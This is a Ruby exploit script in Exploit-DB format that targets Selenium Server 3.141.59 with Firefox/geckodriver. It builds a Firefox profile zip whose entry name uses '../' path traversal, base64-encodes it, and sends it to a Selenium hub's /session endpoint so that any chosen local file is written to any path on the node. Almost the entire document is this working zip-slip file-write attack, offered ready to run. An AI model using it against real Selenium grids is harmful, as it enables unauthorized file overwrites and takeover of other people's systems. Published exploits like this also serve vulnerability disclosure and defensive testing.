#!/usr/bin/env ruby
# Exploit Title: Selenium Node Remote File Upload (Firefox/geckodriver)
# Date: 2021-05-27
# Exploit Author: Jon Stratton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: Selenium Server 3.141.59, webdriver, geckodriver 
# 
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_upload_profile.rb
#
# Selenium sends profile information in a base64 encoded zip file. When it unzips the profile, it does it in an unsafe manner (allows overwrites,
# files to write outside of the unzip dir, etc).

require 'optparse'
require 'net/http'
require 'json'
require 'uri'
require 'zip'
require 'base64'

options = {}
OptionParser.new do |opts|
  opts.banner = 'Usage: example.rb [options]'
  opts.on('-hURL', '--hubURL', 'Selenium Hub URL') do |h|
    options[:hub] = h
  end
  opts.on('-rFILE', '--remoteFILE', 'The destination file name and path of the uploaded files.') do |r|
    options[:remote] = r
  end
  opts.on('-lFILE', '--localFILE', 'The local file to upload.') do |l|
    options[:local] = l
  end
  opts.on('--help', 'Prints this help') do
    puts opts
    exit
  end
end.parse!

hub_url = options[:hub]
remote_file = options[:remote]
local_file = options[:local]

# Read in local file
local_file_h = File.open(local_file, "rb")
local_file_bin = local_file_h.read
local_file_h.close

# Build profile zip file and put the local file in it.
stringio = Zip::OutputStream::write_buffer do |io|
  io.put_next_entry("../../../../../../%s" % [remote_file])
  io.write(local_file_bin)
end
stringio.rewind
encoded_profile = Base64.strict_encode64(stringio.sysread)

# Create session with our new profile
newSession = {:desiredCapabilities => {:browserName => "firefox", :firefox_profile => encoded_profile}, :capabilities => {:firstMatch => [{:browserName => "firefox", :"moz:firefoxOptions" => {:profile => encoded_profile}}]}}

# Start session with encoded_profile and save session id for cleanup.
uri = URI.parse("%s/session" % [hub_url])
http = Net::HTTP.new(uri.host, uri.port)
request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
request.body = JSON.generate(newSession)
response = http.request(request)
sessionId = JSON.parse(response.body)["value"]["sessionId"] ? JSON.parse(response.body)["value"]["sessionId"] : JSON.parse(response.body)["sessionId"]

# End session 
sessionUri = URI.parse("%s/session/%s" % [hub_url, sessionId])
sessionHttp = Net::HTTP.new(sessionUri.host, sessionUri.port)
request = Net::HTTP::Delete.new(sessionUri.request_uri)
response = http.request(request)

exit
